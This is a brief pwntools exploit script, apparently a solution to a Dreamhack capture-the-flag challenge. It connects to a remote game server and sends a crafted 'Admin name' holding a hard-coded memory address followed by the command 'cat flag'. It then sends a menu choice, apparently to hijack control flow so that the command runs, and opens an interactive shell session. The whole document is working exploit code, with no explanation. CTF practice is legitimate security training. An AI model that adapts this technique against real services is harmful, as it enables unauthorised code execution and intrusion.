from pwn import *

context.log_level = 'debug'

r = remote("host2.dreamhack.games", 12515)

r.sendafter("Admin name: ", "\xb0\xa0\x04\x08cat flag")

r.sendafter("What do you want?: ", "19")
r.interactive()
